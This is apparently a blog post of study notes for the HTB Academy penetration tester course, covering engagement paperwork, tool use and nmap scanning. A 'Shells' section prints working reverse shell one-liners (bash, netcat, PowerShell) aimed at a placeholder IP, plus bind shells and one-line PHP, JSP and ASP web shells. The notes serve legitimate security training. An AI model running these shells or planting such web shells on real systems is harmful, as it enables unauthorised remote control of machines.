---
title: "HTB Academy: Penetration Tester"
slug: "pentester"
date: 2023-12-15T05:47:10-05:00
draft: false
summary: "Notes on HTB Academy – [Penetration Tester](https://academy.hackthebox.com/path/preview/penetration-tester)"
description: "Notes on HTB Academy – Penetration Tester"
categories: ["htb"]
tags: []
keywords: ["htb", "hackthebox", "academy", "Pentest"]
cover:
  image: "images/logo.png"
---

## Penetration Testing Overview

A Penetration Test (Pentest) is an organized, targeted, and authorized attack attempt to test IT infrastructure and its defenders to determine their susceptibility to IT security vulnerabilities.

### Precautionary Measures

- Obtain written consent from the owner or authorized representative of the computer or network being tested
- Conduct the testing within the scope of the consent obtained only and respect any limitations specified
- Take measures to prevent causing damage to the systems or networks being tested
- Do not access, use or disclose personal data or any other information obtained during the testing without permission
- Do not intercept electronic communications without the consent of one of the parties to the communication
- Do not conduct testing on systems or networks that are covered by the Health Insurance Portability and Accountability Act (HIPAA) without proper authorization

### Pre-Engagement Documents

| Document                                                       | Timing for Creation                             |
| -------------------------------------------------------------- | ----------------------------------------------- |
| 1. Non-Disclosure Agreement (NDA)                              | After Initial Contact                           |
| 2. Scoping Questionnaire                                       | Before the Pre-Engagement Meeting               |
| 3. Scoping Document                                            | During the Pre-Engagement Meeting               |
| 4. Penetration Testing Proposal (Contract/Scope of Work (SoW)) | During the Pre-engagement Meeting               |
| 5. Rules of Engagement (RoE)                                   | Before the Kick-Off Meeting                     |
| 6. Contractors Agreement (Physical Assessments)                | Before the Kick-Off Meeting                     |
| 7. Reports                                                     | During and after the conducted Penetration Test |

### Critical Scoping Questions

- How many expected live hosts?
- How many IPs/CIDR ranges in scope?
- How many Domains/Subdomains are in scope?
- How many wireless SSIDs in scope?
- How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)?
- For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT?
- If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed?
- What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope?
- Is a separate Active Directory Security Assessment desired?
- Will network testing be conducted from an anonymous user on the network or a standard domain user?
- Do we need to bypass Network Access Control (NAC)?

### Types of Penetration Testing

| Type           | Information Provided                                                                                                                                                                                                                                                |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Blackbox       | Minimal. Only the essential information, such as IP addresses and domains, is provided.                                                                                                                                                                             |
| Greybox        | Extended. In this case, we are provided with additional information, such as specific URLs, hostnames, subnets, and similar.                                                                                                                                        |
| Whitebox       | Maximum. Here everything is disclosed to us. This gives us an internal view of the entire structure, which allows us to prepare an attack using internal information. We may be given detailed configurations, admin credentials, web application source code, etc. |
| Red-Teaming    | May include physical testing and social engineering, among other things. Can be combined with any of the above types.                                                                                                                                               |
| Purple-Teaming | It can be combined with any of the above types. However, it focuses on working closely with the defenders.                                                                                                                                                          |

### Penetration Testing Stages

![Penetration Testing Process](images/pen-process.png)
| Stage | Description |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1. Pre-Engagement | The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions. |
| 2. Information Gathering | Once the pre-engagement activities are complete, we investigate the company's existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions. |
| 3. Vulnerability Assessment | With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions. |
| 4. Exploitation | Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities. |
| 5. Post-Exploitation | Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations). |
| 6. Lateral Movement | If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered. |
| 7. Proof-of-Concept | We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities. |
| 8. Post-Engagement | Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings. |

### Vulnerability Analysis Types

| Analysis Type | Description                                                                                                                                                                                                                                                                                                                                                             |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Descriptive   | Descriptive analysis is essential in any data analysis. On the one hand, it describes a data set based on individual characteristics. It helps to detect possible errors in data collection or outliers in the data set.                                                                                                                                                |
| Diagnostic    | Diagnostic analysis clarifies conditions' causes, effects, and interactions. Doing so provides insights that are obtained through correlations and interpretation. We must take a backward-looking view, similar to descriptive analysis, with the subtle difference that we try to find reasons for events and developments.                                           |
| Predictive    | By evaluating historical and current data, predictive analysis creates a predictive model for future probabilities. Based on the results of descriptive and diagnostic analyses, this method of data analysis makes it possible to identify trends, detect deviations from expected values at an early stage, and predict future occurrences as accurately as possible. |
| Prescriptive  | Prescriptive analytics aims to narrow down what actions to take to eliminate or prevent a future problem or trigger a specific activity or process.                                                                                                                                                                                                                     |

### Common Vulnerabilities and Exposures (CVEs) Research

- [CVEdetails](https://www.cvedetails.com/)
- [Exploit DB](https://www.exploit-db.com/)
- [Vulners](https://vulners.com/)
- [Packet Storm Security](https://packetstormsecurity.com/)
- [NIST](https://nvd.nist.gov/vuln/search?execution=e2s1)

### Practicing Steps

- 2x Modules (one technical, one offensive)
  1. Read the module
  2. Practice the exercises
  3. Complete the module
  4. Start the module exercises from scratch
  5. While solving the exercises again, take notes
  6. Create technical documentation based on the notes
  7. Create non-technical documentation based on the notes
- 3x Retired Machines (two easy, one medium)

  1. Get the user flag on your own
  2. Get the root flag on your own
  3. Write your technical documentation
  4. Write your non-technical documentation
  5. Compare your notes with the official write-up (or a community write-up if you don't have a VIP subscription
  6. Create a list of information you have missed

  7. Watch Ippsec's walkthrough and compare it with your notes
  8. Expand your notes and documentation by adding the missed parts

- 5x Active Machines (two easy, two medium, one hard)
  1. Get the user and root flag
  2. Write your technical documentation
  3. Write your non-technical documentation
  4. Have it proofread by technical and non-technical persons
- 1x Pro Lab / Endgame

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/90)

&nbsp;

---

&nbsp;

## Getting Started

- `CIA triad`: "confidentiality, integrity, and availability of data"
- A `hypervisor` is software that allows us to create and run virtual machines (VMs).
- The `ISO` file is essentially just a CD-ROM that can be mounted within our hypervisor of choice to build the VM by installing the operating system ourselves. An `ISO` gives us more room for customization, e.g., keyboard layout, locale, desktop environment switch, custom partitioning, etc., and therefore a more granular approach when setting up our attack VM.
- The `OVA` file is a pre-built virtual appliance that contains an OVF XML file that specifies the VM hardware settings and a `VMDK`, which is the virtual disk that the operating system is installed on. An OVA is pre-built and therefore can be rapidly deployed to get up and running quicker.
- A `virtual private network (VPN)` allows us to connect to a private (internal) network and access hosts and resources as if we were directly connected to the target private network. It is a secured communications channel over shared public networks to connect to a private network (i.e., an employee remotely connecting to their company's corporate network from their home). VPNs provide a degree of privacy and security by encrypting communications over the channel to prevent eavesdropping and access to data traversing the channel.
  - `netstat -rn` will show us the networks accessible via the VPN.

### Common Ports

| Port(s)       | Protocol        |
| ------------- | --------------- |
| 20/21 (TCP)   | FTP             |
| 22 (TCP)      | SSH             |
| 23 (TCP)      | Telnet          |
| 25 (TCP)      | SMTP            |
| 80 (TCP)      | HTTP            |
| 161 (TCP/UDP) | SNMP            |
| 389 (TCP/UDP) | LDAP            |
| 443 (TCP)     | SSL/TLS (HTTPS) |
| 445 (TCP)     | SMB             |
| 3389 (TCP)    | RDP             |

### Tools

- `Secure Shell (SSH)` is a network protocol that runs on port 22 by default and provides users such as system administrators a secure way to access a computer remotely.
- `Netcat`, `ncat`, or `nc`, is an excellent network utility for interacting with TCP/UDP ports. There's another Windows alternative to netcat coded in PowerShell called [`PowerCat`](https://github.com/besimorhino/powercat).
- Another similar network utility is [`socat`](https://linux.die.net/man/1/socat), which has a few features that netcat does not support, like forwarding ports and connecting to serial devices. Socat can also be used to upgrade a shell to a [fully interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat).
- Terminal multiplexers, like `tmux` or `Screen`, are great utilities for expanding a standard Linux terminal's features, like having multiple windows within one terminal and jumping between them.
- `Vim` is a great text editor that can be used for writing code or editing text files on Linux systems. -`nmap` for network enumeration and vulnerability scanning.
  - `nmap -sV --script=banner -p<port> <host(s)>` and `nc -nv <host> <port>`can be used for `Banner Grabbing`
- A tool that can enumerate and interact with SMB shares is `smbclient`.
- SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.

```sh
woadey@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"

woadey@htb[/htb]$ snmpwalk -v 2c -c private  10.129.42.253

Timeout: No Response from 10.129.42.253
```

- A tool such as [`onesixtyone`](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool.

```sh
woadey@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254

Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
```

- We can use a tool such as [`ffuf`](https://github.com/ffuf/ffuf) or [`GoBuster`](https://github.com/OJ/gobuster) to perform this directory enumeration.

```sh
woadey@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.121/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/11 21:47:25 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.php (Status: 200)
/server-status (Status: 403)
/wordpress (Status: 301)
===============================================================
2020/12/11 21:47:46 Finished
===============================================================
```

- We can use `cURL` to retrieve server header information from the command line. `cURL` can also pull down files.

```sh
woadey@htb[/htb]$ curl -IL https://www.inlanefreight.com

HTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8

woadey@htb[/htb]$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

- Another handy tool is [`EyeWitness`](https://github.com/FortyNorthSecurity/EyeWitness), which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.
- We can extract the version of web servers, supporting frameworks, and applications using the command-line tool `whatweb`.

```sh
woadey@htb[/htb]$ whatweb 10.10.10.121

http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]

woadey@htb[/htb]$ whatweb --no-errors 10.10.10.0/24

http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]
http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]
```

- One method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host.

```sh
woadey@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

- In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to `base64` encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it.

```sh
woadey@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

```sh
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

### Shells

- A `Reverse Shell` is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) has many reverse shell payloads:

**Linux Victim**

```sh
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
...or...
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

**Windows Victim**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

- Another type of shell is a `Bind Shell`. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port. Once we execute a Bind Shell Command, it will start listening on a port on the remote host and bind that host's shell, i.e., Bash or PowerShell, to that port. We have to connect to that port with netcat, and we will get control through a shell on that system. [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) again has payloads for this.

**Linux Victim**

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
...or...
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

**Windows Victim**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

- The final type of shell we have is a `Web Shell`. A `Web Shell` is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.

**php**

```php
<?php system($_REQUEST["cmd"]); ?>
```

**jsp**

```php
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**asp**

```php
<% eval request("cmd") %>
```

### PrivEsc Checklists

Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is [HackTricks](https://book.hacktricks.xyz/), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation. Another excellent repository is [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), which also has checklists for both [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) and [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md). We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.

### Enumeration Scripts

Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include [LinEnum](https://github.com/rebootuser/LinEnum.git) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), and for Windows include [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS).

Another useful tool we may use for server enumeration is the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.

[GTFOBins](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through `sudo`

[LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.

### Practice Resources

| Platform                                                                                      | Description                                                                                                                                                                                                                    |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)                                 | Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire [OWASP Top Ten](https://owasp.org/www-project-top-ten) along with many other real-world application security flaws. |
| [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) | Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.                                                                                                     |
| [Metasploitable 3](https://github.com/rapid7/metasploitable3)                                 | Is a template for building a vulnerable Windows VM configured with a wide range of [vulnerabilities](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities).                                                          |
| [DVWA](https://github.com/digininja/DVWA)                                                     | This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.                                                                                      |
| [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)                            | Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.                                                                   |
| [VbScrub](https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ)                           | Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.                                                                                                                      |
| [STÖK](https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg)                              | Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.                                                                                                    |
| [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)                      | Provides videos on a wide variety of technical infosec topics.                                                                                                                                                                 |

### First Attack

For an entire write-up of this box, see [HTB Writeup: Nibbles](/posts/htb/easy/nibbles).

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/77)

&nbsp;

---

&nbsp;

## Network Enumeration with Nmap

### Nmap Architecture

- Host discovery
- Port scanning
- Service enumeration and detection
- OS detection
- Scriptable interaction with the target service (Nmap Scripting Engine)

### TCP-SYN Scan

The TCP-SYN scan (`-sS`) is one of the default settings unless we have defined otherwise and is also one of the most popular scan methods. This scan method makes it possible to scan several thousand ports per second. The TCP-SYN scan sends one packet with the SYN flag and, therefore, never completes the three-way handshake, which results in not establishing a full TCP connection to the scanned port.

- If our target sends an `SYN-ACK` flagged packet back to the scanned port, Nmap detects that the port is open.
- If the packet receives an `RST` flag, it is an indicator that the port is closed.
- If Nmap does not receive a packet back, it will display it as filtered. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.

### Scan Network Range

```sh
woadey@htb[/htb]$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5

10.129.2.4
10.129.2.10
10.129.2.11
10.129.2.18
10.129.2.19
10.129.2.20
10.129.2.28
```

| Scanning Options | Description                                                      |
| ---------------- | ---------------------------------------------------------------- |
| `10.129.2.0/24`  | Target network range.                                            |
| `-sn`            | Disables port scanning.                                          |
| `-oA tnet`       | Stores the results in all formats starting with the name 'tnet'. |

### Scan IP List

```sh
woadey@htb[/htb]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5

10.129.2.18
10.129.2.19
10.129.2.20
```

| Scanning Options | Description                                                          |
| ---------------- | -------------------------------------------------------------------- |
| `-sn`            | Disables port scanning.                                              |
| `-oA tnet`       | Stores the results in all formats starting with the name 'tnet'.     |
| `-iL`            | Performs defined scans against targets in provided 'hosts.lst' list. |

### Scan Multiple IPs

```sh
woadey@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d" " -f5

10.129.2.18
10.129.2.19
10.129.2.20
```

```sh
woadey@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d" " -f5

10.129.2.18
10.129.2.19
10.129.2.20
```

### Scan Single IP

```sh
woadey@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 23:59 CEST
Nmap scan report for 10.129.2.18
Host is up (0.087s latency).
MAC Address: DE:AD:00:00:BE:EF
Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
```

| Scanning Options | Description                                                      |
| ---------------- | ---------------------------------------------------------------- |
| `10.129.2.18`    | Performs defined scans against the target.                       |
| `-sn`            | Disables port scanning.                                          |
| `-oA host`       | Stores the results in all formats starting with the name 'host'. |

\*_If we disable port scan (`-sn`), Nmap automatically ping scan with ICMP Echo Requests (`-PE`). Once such a request is sent, we usually expect an ICMP reply if the pinging host is alive. The more interesting fact is that our previous scans did not do that because before Nmap could send an ICMP echo request, it would send an ARP ping resulting in an ARP reply. We can confirm this with the "`--packet-trace`" option. To ensure that ICMP echo requests are sent, we also define the option (`-PE`) for this._

```sh
woadey@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST
SENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2
RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF
Nmap scan report for 10.129.2.18
Host is up (0.023s latency).
MAC Address: DE:AD:00:00:BE:EF
Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

| Scanning Options | Description                                                              |
| ---------------- | ------------------------------------------------------------------------ |
| `10.129.2.18`    | Performs defined scans against the target.                               |
| `-sn`            | Disables port scanning.                                                  |
| `-oA host`       | Stores the results in all formats starting with the name 'host'.         |
| `-PE`            | Performs the ping scan by using 'ICMP Echo requests' against the target. |
| `--packet-trace` | Shows all packets sent and received.                                     |

```sh
woadey@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CEST
SENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2
RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF
Nmap scan report for 10.129.2.18
Host is up, received arp-response (0.028s latency).
MAC Address: DE:AD:00:00:BE:EF
Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds
```

| Scanning Options | Description                                                              |
| ---------------- | ------------------------------------------------------------------------ |
| `10.129.2.18`    | Performs defined scans against the target.                               |
| `-sn`            | Disables port scanning.                                                  |
| `-oA host`       | Stores the results in all formats starting with the name 'host'.         |
| `-PE`            | Performs the ping scan by using 'ICMP Echo requests' against the target. |
| `--reason`       | Displays the reason for specific result.                                 |

### Nmap Cheatsheet

**Scanning Options**

| Nmap Option          | Description                                                            |
| -------------------- | ---------------------------------------------------------------------- |
| `10.10.10.0/24`      | Target network range.                                                  |
| `-sn`                | Disables port scanning.                                                |
| `-Pn`                | Disables ICMP Echo Requests                                            |
| `-n`                 | Disables DNS Resolution.                                               |
| `-PE`                | Performs the ping scan by using ICMP Echo Requests against the target. |
| `--packet-trace`     | Shows all packets sent and received.                                   |
| `--reason`           | Displays the reason for a specific result.                             |
| `--disable-arp-ping` | Disables ARP Ping Requests.                                            |
| `--top-ports=<num>`  | Scans the specified top ports that have been defined as most frequent. |
| `-p-`                | Scan all ports.                                                        |
| `-p22-110`           | Scan all ports between 22 and 110.                                     |
| `-p22,25`            | Scans only the specified ports 22 and 25.                              |
| `-F`                 | Scans top 100 ports.                                                   |
| `-sS`                | Performs an TCP SYN-Scan.                                              |
| `-sA`                | Performs an TCP ACK-Scan.                                              |
| `-sU`                | Performs an UDP Scan.                                                  |
| `-sV`                | Scans the discovered services for their versions.                      |
| `-sC`                | Perform a Script Scan with scripts that are categorized as "default".  |
| `--script <script>`  | Performs a Script Scan by using the specified scripts.                 |
| `-O`                 | Performs an OS Detection Scan to determine the OS of the target.       |
| `-A`                 | Performs OS Detection, Service Detection, and traceroute scans.        |
| `-D RND:5`           | Sets the number of random Decoys that will be used to scan the target. |
| `-e`                 | Specifies the network interface that is used for the scan.             |
| `-S 10.10.10.200`    | Specifies the source IP address for the scan.                          |
| `-g`                 | Specifies the source port for the scan.                                |
| `--dns-server <ns>`  | DNS resolution is performed by using a specified name server.          |

**Output Options**

| Nmap Option    | Description                                                                       |
| -------------- | --------------------------------------------------------------------------------- |
| `-oA filename` | Stores the results in all available formats starting with the name of "filename". |
| `-oN filename` | Stores the results in normal format with the name "filename".                     |
| `-oG filename` | Stores the results in "grepable" format with the name of "filename".              |
| `-oX filename` | Stores the results in XML format with the name of "filename".                     |

**Performance Options**

| Nmap Option                  | Description                                                  |
| ---------------------------- | ------------------------------------------------------------ |
| `--max-retries <num>`        | Sets the number of retries for scans of specific ports.      |
| `--stats-every=5s`           | Displays scan's status every 5 seconds.                      |
| `-v/-vv`                     | Displays verbose output during the scan.                     |
| `--initial-rtt-timeout 50ms` | Sets the specified time value as initial RTT timeout.        |
| `--max-rtt-timeout 100ms`    | Sets the specified time value as maximum RTT timeout.        |
| `--min-rate 300`             | Sets the number of packets that will be sent simultaneously. |
| `-T <0-5>`                   | Specifies the specific timing template.                      |

### Host and Port Scanning

| State            | Description                                                                                                                                                                                           |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| open             | This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.                                    |
| closed           | When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not. |
| filtered         | Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.                |
| unfiltered       | This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.                                             |
| open\|filtered   | If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.                                                |
| closed\|filtered | This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.                                             |

### Nmap Scripting Engine (NSE)

| Category  | Description                                                                                                                             |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| auth      | Determination of authentication credentials.                                                                                            |
| broadcast | Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans. |
| brute     | Executes scripts that try to log in to the respective service by brute-forcing with credentials.                                        |
| default   | Default scripts executed by using the `-sC` option.                                                                                     |
| discovery | Evaluation of accessible services.                                                                                                      |
| dos       | These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.              |
| exploit   | This category of scripts tries to exploit known vulnerabilities for the scanned port.                                                   |
| external  | Scripts that use external services for further processing.                                                                              |
| fuzzer    | This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.     |
| intrusive | Intrusive scripts that could negatively affect the target system.                                                                       |
| malware   | Checks if some malware infects the target system.                                                                                       |
| safe      | Defensive scripts that do not perform intrusive and destructive access.                                                                 |
| version   | Extension for service detection.                                                                                                        |
| vuln      | Identification of specific vulnerabilities.                                                                                             |

### Decoys

